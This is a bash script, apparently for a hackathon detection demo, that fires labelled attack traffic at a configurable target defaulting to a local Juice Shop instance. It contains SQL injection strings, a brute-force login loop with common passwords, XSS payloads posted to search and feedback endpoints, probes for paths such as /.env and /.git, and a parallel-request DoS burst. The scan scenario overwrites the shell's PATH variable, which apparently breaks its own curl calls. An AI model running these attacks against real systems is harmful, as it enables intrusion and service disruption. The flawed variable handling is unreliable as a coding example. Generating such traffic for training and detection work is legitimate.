#!/bin/bash
# Attack simulation scripts for hackathon demo

TARGET="${TARGET:-http://localhost:3000}"
SCENARIO="${1:-sqli}"

echo "Starting attack scenario: $SCENARIO against $TARGET"

case $SCENARIO in
  sqli)
    echo "=== SQL Injection Attack ==="
    # Basic SQL injection probes
    for i in {1..20}; do
      curl -s "$TARGET/rest/products/search?q=apple'))--" \
        -H "User-Agent: sqlmap/1.5" \
        -H "X-Attack-Scenario: sqli" \
        -o /dev/null
      
      curl -s "$TARGET/rest/products/search?q=' OR 1=1--" \
        -H "User-Agent: sqlmap/1.5" \
        -H "X-Attack-Scenario: sqli" \
        -o /dev/null
      
      curl -s "$TARGET/api/Products/1' UNION SELECT * FROM Users--" \
        -H "User-Agent: sqlmap/1.5" \
        -H "X-Attack-Scenario: sqli" \
        -o /dev/null
      
      echo -n "."
      sleep 0.5
    done
    echo -e "\nSQL injection attack completed"
    ;;
    
  brute)
    echo "=== Brute Force Login Attack ==="
    # Brute force login attempts
    PASSWORDS=("admin" "password" "123456" "admin123" "test" "letmein" "password123" "qwerty")
    
    for i in {1..50}; do
      PASS=${PASSWORDS[$RANDOM % ${#PASSWORDS[@]}]}
      curl -s -X POST "$TARGET/rest/user/login" \
        -H "Content-Type: application/json" \
        -H "User-Agent: Hydra/9.0" \
        -H "X-Attack-Scenario: brute" \
        -d "{\"email\":\"admin@juice-sh.op\",\"password\":\"$PASS\"}" \
        -o /dev/null
      
      echo -n "."
      sleep 0.3
    done
    echo -e "\nBrute force attack completed"
    ;;
    
  xss)
    echo "=== Cross-Site Scripting (XSS) Attack ==="
    XSS_PAYLOADS=(
      "<script>alert('XSS')</script>"
      "<img src=x onerror=alert('XSS')>"
      "<svg onload=alert('XSS')>"
      "javascript:alert('XSS')"
    )
    
    for i in {1..15}; do
      PAYLOAD=${XSS_PAYLOADS[$RANDOM % ${#XSS_PAYLOADS[@]}]}
      curl -s "$TARGET/rest/products/search?q=$PAYLOAD" \
        -H "User-Agent: Mozilla/5.0 (XSS-Bot)" \
        -H "X-Attack-Scenario: xss" \
        -o /dev/null
      
      curl -s -X POST "$TARGET/api/Feedbacks" \
        -H "Content-Type: application/json" \
        -H "X-Attack-Scenario: xss" \
        -d "{\"comment\":\"$PAYLOAD\",\"rating\":5}" \
        -o /dev/null
      
      echo -n "."
      sleep 0.5
    done
    echo -e "\nXSS attack completed"
    ;;
    
  scan)
    echo "=== Port/Directory Scanning ==="
    PATHS=(
      "/admin"
      "/config"
      "/backup"
      "/debug"
      "/.git"
      "/.env"
      "/phpinfo.php"
      "/wp-admin"
      "/api/users"
      "/api/config"
      "/internal"
      "/management"
    )
    
    for i in {1..30}; do
      PATH=${PATHS[$RANDOM % ${#PATHS[@]}]}
      curl -s "$TARGET$PATH" \
        -H "User-Agent: Nmap/7.91" \
        -H "X-Attack-Scenario: scan" \
        -o /dev/null
      
      echo -n "."
      sleep 0.2
    done
    echo -e "\nScanning attack completed"
    ;;
    
  dos)
    echo "=== Denial of Service (DoS) Attack ==="
    # High-volume requests
    for i in {1..100}; do
      curl -s "$TARGET/rest/products/search?q=test" \
        -H "User-Agent: DoS-Bot" \
        -H "X-Attack-Scenario: dos" \
        -o /dev/null &
      
      if [ $((i % 10)) -eq 0 ]; then
        echo -n "."
        wait
      fi
    done
    wait
    echo -e "\nDoS attack completed"
    ;;
    
  combo)
    echo "=== Multi-Stage Attack (Combo) ==="
    echo "Stage 1: Reconnaissance..."
    bash $0 scan &
    P1=$!
    
    sleep 5
    echo "Stage 2: SQL Injection..."
    bash $0 sqli &
    P2=$!
    
    sleep 3
    echo "Stage 3: Brute Force..."
    bash $0 brute &
    P3=$!
    
    wait $P1 $P2 $P3
    echo -e "\nMulti-stage attack completed"
    ;;
    
  normal)
    echo "=== Normal Traffic Simulation ==="
    PAGES=("/rest/products/search?q=apple" "/rest/products/1" "/rest/basket/1" "/api/Challenges")
    
    for i in {1..50}; do
      PAGE=${PAGES[$RANDOM % ${#PAGES[@]}]}
      curl -s "$TARGET$PAGE" \
        -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)" \
        -o /dev/null
      
      echo -n "."
      sleep 1
    done
    echo -e "\nNormal traffic completed"
    ;;
    
  *)
    echo "Unknown scenario: $SCENARIO"
    echo "Available scenarios: sqli, brute, xss, scan, dos, combo, normal"
    exit 1
    ;;
esac

echo "Attack scenario '$SCENARIO' finished at $(date)"
